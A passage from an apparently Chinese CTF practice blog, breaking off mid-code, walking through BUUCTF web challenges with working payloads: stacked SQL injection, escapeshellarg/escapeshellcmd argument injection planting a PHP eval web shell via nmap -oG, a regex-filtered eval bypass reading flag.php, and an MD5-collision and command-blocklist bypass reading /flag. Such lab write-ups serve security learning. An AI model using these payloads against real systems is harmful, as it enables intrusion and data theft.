-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?inject&#x3D;-1&#39;;</span><br><span class="line">set @sql &#x3D; CONCAT(&#39;se&#39;,&#39;lect * from &#96;1919810931114514&#96;;&#39;);</span><br><span class="line">prepare stmt from @sql;</span><br><span class="line">EXECUTE stmt;</span><br><span class="line">#</span><br></pre></td></tr></table></figure>
-
-<p>发现</p>
-<p><img src="/2020/08/02/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/2-5.png" alt="2-5"></p>
-<p>这里简单，只要将set和prepare改成大写即可</p>
-<h3 id="法二：更改表名列名"><a href="#法二：更改表名列名" class="headerlink" title="法二：更改表名列名"></a>法二：<strong>更改表名列名</strong></h3><p>通过爆破点以及其上的分析，我们可以大胆猜测后台语句是</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from words where id&#x3D;&#39;&#39;</span><br></pre></td></tr></table></figure>
-
-<p>这样我们只要把1919810931114514改成words，然后将flag字段改成id或者添加一个id字段</p>
-<blockquote>
-<p>修改表名和列名的语法</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">修改表名(将表名user改为users)</span><br><span class="line">alter table user rename to users;</span><br><span class="line"></span><br><span class="line">修改列名(将字段名username改为name)</span><br><span class="line">alter table users change uesrname name varchar(30);</span><br></pre></td></tr></table></figure>
-</blockquote>
-<p>可以构造payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;</span><br><span class="line">alter table words rename to words1;</span><br><span class="line">alter table &#96;1919810931114514&#96; rename to words;</span><br><span class="line">alter table words change flag id varchar(50);</span><br><span class="line">#</span><br></pre></td></tr></table></figure>
-
-<p>那么现在我们的语句就相当于</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from 1919810931114514 where flag&#x3D;&#39;&#39;</span><br></pre></td></tr></table></figure>
-
-<p>此时只要构造一个永真语句即可获得flag</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject&#x3D;1&#39; or 1&#x3D;&#39;1</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h2 id="GYCTF"><a href="#GYCTF" class="headerlink" title="GYCTF"></a>GYCTF</h2><p>找注入点什么的都几乎一样，可是这次的过滤就更加严格了：<img src="/2020/08/02/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/2-6.png" alt="2-6"></p>
-<p>像上一关两种方法的set和alter都不能使用了</p>
-<h3 id="这里引进一种新的方法handler"><a href="#这里引进一种新的方法handler" class="headerlink" title="这里引进一种新的方法handler"></a>这里引进一种新的方法handler</h3><blockquote>
-<p>通过HANDLER tbl_name OPEN打开一张表，无返回结果， 实际上我们在这里声明了一个名为tb1_name的句柄。 </p>
-<p>通过HANDLER tbl_name READ FIRST获取句柄的第一行， 通过READ NEXT依次获取其它行。</p>
-<p>最后一行执行之后再执行NEXT会返回一个空的结果。 </p>
-<p>通过HANDLER tbl_name CLOSE来关闭打开的句柄。 </p>
-</blockquote>
-<p>我们就可以构造payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;</span><br><span class="line">handler FlagHere open;</span><br><span class="line">handler FlagHere read first;</span><br><span class="line">Handler FlagHere close;</span><br><span class="line">#</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-
-
-<h1 id="BUUCTF-2018-Online-Tool【escapeshellarg和escapeshellcmd】"><a href="#BUUCTF-2018-Online-Tool【escapeshellarg和escapeshellcmd】" class="headerlink" title="[BUUCTF 2018]Online Tool【escapeshellarg和escapeshellcmd】"></a>[BUUCTF 2018]Online Tool【escapeshellarg<code>和</code>escapeshellcmd】</h1><p>进去直接看到一串源码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>])) &#123;</span><br><span class="line">    $_SERVER[<span class="string">'REMOTE_ADDR'</span>] = $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'host'</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $host = $_GET[<span class="string">'host'</span>];</span><br><span class="line">    $host = escapeshellarg($host);</span><br><span class="line">    $host = escapeshellcmd($host);</span><br><span class="line">    $sandbox = md5(<span class="string">"glzjin"</span>. $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'you are in sandbox '</span>.$sandbox;</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    chdir($sandbox);</span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">"nmap -T5 -sT -Pn --host-timeout 2 -F "</span>.$host);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>我们首先看到<code>escapeshellarg</code>和<code>escapeshellcmd</code>两个函数，不太了解，所以去大概查了一下，<a href="https://paper.seebug.org/164/" target="_blank" rel="noopener">PHP escapeshellarg()+escapeshellcmd() 之殇</a>，里面讲到了两个函数结合出现时会有漏洞：</p>
-<blockquote>
-<p>我们详细分析一下：</p>
-<ol>
-<li>传入的参数是：<code>172.17.0.2&#39; -v -d a=1</code></li>
-<li>经过<code>escapeshellarg</code>处理后变成了<code>&#39;172.17.0.2&#39;\&#39;&#39; -v -d a=1&#39;</code>，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。</li>
-<li>经过<code>escapeshellcmd</code>处理后变成<code>&#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1\&#39;</code>，这是因为<code>escapeshellcmd</code>对<code>\</code>以及最后那个<strong>不配对儿</strong>的引号进行了转义：<a href="http://php.net/manual/zh/function.escapeshellcmd.php" target="_blank" rel="noopener">http://php.net/manual/zh/function.escapeshellcmd.php</a></li>
-<li>最后执行的命令是<code>curl &#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1\&#39;</code>，由于中间的<code>\\</code>被解释为<code>\</code>而不再是转义字符，所以后面的<code>&#39;</code>没有被转义，与再后面的<code>&#39;</code>配对儿成了一个空白连接符。所以可以简化为<code>curl 172.17.0.2\ -v -d a=1&#39;</code>，即向<code>172.17.0.2\</code>发起请求，POST 数据为<code>a=1&#39;</code>。</li>
-</ol>
-<p>如果不加这个单引号，原句最后会变成<code>curl &#39;172.17.0.2 -v -d a=1&#39;</code>，也就相当于无法给curl请求增加参数</p>
-</blockquote>
-<p>看回到我们这题：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);</span><br></pre></td></tr></table></figure>
-
-<p>因为<code>escapeshellcmd</code>函数会过滤掉<code>；</code>，所以不能使用类似于如下的注入</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;ls</span><br></pre></td></tr></table></figure>
-
-<p>那我们就只能思考如何利用nmap命令，经过查资料我们发现：nmap的-oG参数-，这个参数可以实现将命令和结果写到文件。</p>
-<p>下面我们开始构造payload，利用本地测试方便一些【在Windows上测试一直出现奇奇怪怪的问题，必须要在linux上测试】</p>
-<p>测试环境如下</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    $a=<span class="string">"payload"</span>;</span><br><span class="line">    $b=escapeshellarg($a);</span><br><span class="line">    $c=escapeshellcmd($b);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> $a.<span class="string">"\n"</span>;</span><br><span class="line">    <span class="keyword">echo</span> $b.<span class="string">"\n"</span>;</span><br><span class="line">    <span class="keyword">echo</span> $c.<span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>但是如果我们直接构造</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload&#x3D;xxx -oG ag.php</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/08/02/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/3-1.png" alt="3-1"></p>
-<p>这样整条语句就变成了</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T5 -sT -Pn --host-timeout 2 -F &#39;xxx -oG ag.php&#39;</span><br></pre></td></tr></table></figure>
-
-<p>无法执行引号里的语句，于是我们构造</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload&#x3D;&#39; xxx -oG ag.php &#39;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/08/02/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/3-2.png" alt="3-2"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nmap -T5 -sT -Pn --host-timeout 2 -F &#39;&#39;\\&#39;&#39; xxx -oG ag.php &#39;\\&#39;&#39;&#39;</span><br><span class="line">化简后即</span><br><span class="line">nmap -T5 -sT -Pn --host-timeout 2 -F \ xxx -oG ag.php &#39;\&#39;</span><br><span class="line">即可成功执行</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<p>像这种上传的东西，我们可以先上传个phpinfo()试试水</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?host&#x3D;&#39; &lt;?php phpinfo();?&gt; -oG ag.php &#39;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/08/02/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/3-3.png" alt="3-3">)<img src="/2020/08/02/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/3-4.png" alt="3-4"></p>
-<p>发现成功，接下来传一句话木马，连接antsword即可</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?host&#x3D;&#39; &lt;?php @eval($_POST[&quot;ag&quot;]);?&gt; -oG ag.php &#39;</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-
-
-
-
-<h1 id="GXYCTF2019-禁止套娃【正则】"><a href="#GXYCTF2019-禁止套娃【正则】" class="headerlink" title="[GXYCTF2019]禁止套娃【正则】"></a>[GXYCTF2019]禁止套娃【正则】</h1><p>先用扫描器扫描一下，发现了flag.php和/.git，但是直接读取flag.php失败。</p>
-<p>于是用GitHack扫一下拿到源码，但是我这里老是扫不出来，就很难受。</p>
-<p><img src="/2020/08/02/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/4-1.png" alt="4-1"></p>
-<p>所以直接拿了源码来分析下</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"flag在哪里呢？&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'exp'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z,_]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET['exp'];</span></span><br><span class="line">                @<span class="keyword">eval</span>($_GET[<span class="string">'exp'</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"还差一点哦！"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"再好好想想！"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"还想读flag，臭弟弟！"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>可以看出一共有三层过滤，我们一层一层来分析</p>
-<ol>
-<li><p>第一层</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span>, $_GET[<span class="string">'exp'</span>]))</span><br></pre></td></tr></table></figure>
-
-<p>这句过滤了大部分伪协议读取，<code>data://|filter://|php://|phar://</code></p>
-</li>
-<li><p>第二层</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z,_]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $_GET[<span class="string">'exp'</span>]))</span><br></pre></td></tr></table></figure>
-
-<p>这句一开始真没看懂，查了大佬的wp才看懂。</p>
-<p><code>(?R)</code>代表引用当前表达式，那这句估计就是题目标题的意思了：套娃。</p>
-<p>这句整个就代表<strong>一个字母与下划线组成的字符串</strong>加一个<strong>括号</strong>，括号里面没有东西或者继续引用本语句，也就是类似于</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx(aaa(bb()));			&#x2F;&#x2F;bb()里必须是空的</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>第三层</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span>, $_GET[<span class="string">'exp'</span>]))</span><br></pre></td></tr></table></figure>
-
-<p>过滤了一些字符串，也就相当于过滤了一些函数，例如<code>file_get_content()</code>,<code>hex()</code>。</p>
-</li>
-</ol>
-<p>首先我们是需要读取flag.php，虽然file_get_content被过滤了，但还是有许多函数可以使用，例如<code>readfile()</code>,<code>highlight_file()</code>,<code>show_source()</code>。</p>
-<p>接着我们要解决不能输入flag.php参数问题，我们想到scandir(.)里面会有flag.php，但是.也是参数啊。</p>
-<p>这时就有一个很骚的操作了</p>
-<blockquote>
-<p>localeconv函数:返回一包含本地数字及货币格式信息的数组。</p>
-<p>很巧的是，这个数组第一位就是.</p>
-<p>current() 返回数组中的当前单元, 默认取第一个值。</p>
-<p>我们结合利用：</p>
-<p>current(localeconv())返回值就是.</p>
-</blockquote>
-<p>于是<code>?exp=print_r(scandir(current(localeconv())))</code>得到</p>
-<p><img src="/2020/08/02/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/4-2.png" alt="4-2"></p>
-<p>下面的问题就是如何读取这个flag.php</p>
-<p><img src="/2020/08/02/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/4-3.png" alt="4-3"></p>
-<ol>
-<li><p>方法一：利用array_reverse()将数组倒序，然后next()读取第二个</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp&#x3D;print_r(readfile(next(array_reverse(scandir(current(localeconv()))))));</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>方法二：array_flip()交换数组的键和值，然后array_rand()随机读取数组的键</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp&#x3D;print_r(highlight_file(array_rand(array_flip(scandir(current(localeconv()))))));</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>方法三：利用sessionid</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp&#x3D;print_r(show_source(session_id(session_start())))</span><br></pre></td></tr></table></figure>
-
-<p>使用这个exp后，要利用bp抓包，然后加上cookie<img src="/2020/08/02/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/4-4.png" alt="4-4"></p>
-</li>
-</ol>
-<h1 id="安洵杯-2019-easy-web【MD5-bypass】"><a href="#安洵杯-2019-easy-web【MD5-bypass】" class="headerlink" title="[安洵杯 2019]easy_web【MD5/bypass】"></a>[安洵杯 2019]easy_web【MD5/bypass】</h1><p>进去观察网址栏</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;5163acd7-7850-4f24-a2b4-cef0277781e7.node3.buuoj.cn&#x2F;index.php?img&#x3D;TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd&#x3D;</span><br></pre></td></tr></table></figure>
-
-<p>发现<code>TXpVek5UTTFNbVUzTURabE5qYz0</code>很显眼，经过两次base64解密和一次十六进制解密后，得到<code>555.png</code>，猜想img=表示获取后面的内容，于是我们对index.php进行反向加密，输入后得到源码:</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</span><br><span class="line">$cmd = $_GET[<span class="string">'cmd'</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'img'</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>])) </span><br><span class="line">    header(<span class="string">'Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd='</span>);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[<span class="string">'img'</span>])));   <span class="comment">//把十六进制转为ASCII字符</span></span><br><span class="line"></span><br><span class="line">$file = preg_replace(<span class="string">"/[^a-zA-Z0-9.]+/"</span>, <span class="string">""</span>, $file);</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/flag/i"</span>, $file)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;img src ="./ctf3.jpeg"&gt;'</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"xixi～ no flag"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $txt = base64_encode(file_get_contents($file));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;img src='data:image/gif;base64,"</span> . $txt . <span class="string">"'&gt;&lt;/img&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $cmd;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i"</span>, $cmd)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">"forbid ~"</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((string)$_POST[<span class="string">'a'</span>] !== (string)$_POST[<span class="string">'b'</span>] &amp;&amp; md5($_POST[<span class="string">'a'</span>]) === md5($_POST[<span class="string">'b'</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `$cmd`;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">"md5 is funny ~"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>这里的重点有两个：</p>
-<p><strong>第一个是：</strong></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i"</span>, $cmd)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">"forbid ~"</span>);php</span><br></pre></td></tr></table></figure>
-
-<p>对于$cmd过滤了许多重要命令，比如cat</p>
-<p><strong>第二个是：</strong></p>
-<p>需要有一个md5的强类型比较</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if ((string)$_POST[&#39;a&#39;] !&#x3D;&#x3D; (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) &#x3D;&#x3D;&#x3D; md5($_POST[&#39;b&#39;])) &#123;</span><br><span class="line">        echo &#96;$cmd&#96;;</span><br></pre></td></tr></table></figure>
-
-<p>对于这一点，网上有现成的绕过方法：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line">&amp;b&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure>
-
-<p><strong>注意复制这个值到bp的时候，有时bp会自动把%转成%25，导致错误。</strong></p>
-<p>而对于第一点，有两种方法：</p>
-<p><strong>第一种：</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ca\t%20&#x2F;flag</span><br></pre></td></tr></table></figure>
-
-<p>看似原题中过滤了cat和\，但在这里<code>\t</code>被当成TAB而没有被过滤，就可以读取到flag。</p>
-<p><strong>第二种：</strong></p>
-<blockquote>
-<p>Linux sort命令用于将文本文件内容加以排序。</p>
-<p>sort可针对文本文件的内容，以行为单位来排序。</p>
-</blockquote>
-<p>我们可以利用sort命令</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sort%20&#x2F;flag</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-
-
-<h1 id="BUUCTF-BJDCTF2020-Mark-loves-cat【php变量覆盖】"><a href="#BUUCTF-BJDCTF2020-Mark-loves-cat【php变量覆盖】" class="headerlink" title="BUUCTF [BJDCTF2020]Mark loves cat【php变量覆盖】"></a>BUUCTF [BJDCTF2020]Mark loves cat【php变量覆盖】</h1><p>先是扫一下目录，发现是git泄露，然后githack扫一下【我的似乎有点问题，咋都扫不出来】，直接白嫖了别人扫出来的：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span><span class="string">'flag.php'</span>;</span><br><span class="line">$yds = <span class="string">"dog"</span>;</span><br><span class="line">$is = <span class="string">"cat"</span>;</span><br><span class="line">$handsome = <span class="string">'yds'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123; </span><br><span class="line">    $$x = $$y;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123; </span><br><span class="line">    <span class="keyword">if</span>($_GET[<span class="string">'flag'</span>] === $x &amp;&amp; $x !== <span class="string">'flag'</span>)&#123; <span class="comment">//判断get传进来的值等不等于flag 如果等于flag则跳过</span></span><br><span class="line">        <span class="keyword">exit</span>($handsome);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>]) &amp;&amp; !<span class="keyword">isset</span>($_POST[<span 